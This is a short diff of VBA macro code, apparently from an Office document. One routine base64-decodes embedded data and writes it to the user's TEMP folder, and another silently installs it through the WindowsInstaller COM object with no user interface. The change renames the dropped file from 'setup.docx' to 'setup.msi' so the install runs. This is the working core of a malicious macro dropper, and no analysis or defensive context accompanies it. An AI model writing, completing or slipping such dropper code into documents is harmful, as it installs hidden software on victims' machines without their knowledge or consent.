@@ -25,7 +25,7 @@ Sub ExtractAbcxToFile()
     Dim fileBytes() As Byte
     fileBytes = Base64Decode(result)
 
-    filePath = Environ("TEMP") & "\setup.docx"
+    filePath = Environ("TEMP") & "\setup.msi"
     WriteBytesToFile filePath, fileBytes
 End Sub
 
@@ -59,7 +59,7 @@ Sub RunMSI_COM()
     Dim filePath As String
     
     Set installer = CreateObject("WindowsInstaller.Installer")
-    filePath = Environ("TEMP") & "\setup.docx"
+    filePath = Environ("TEMP") & "\setup.msi"
     
     installer.InstallProduct filePath, "ACTION=INSTALL UILevel=0"
 End Sub
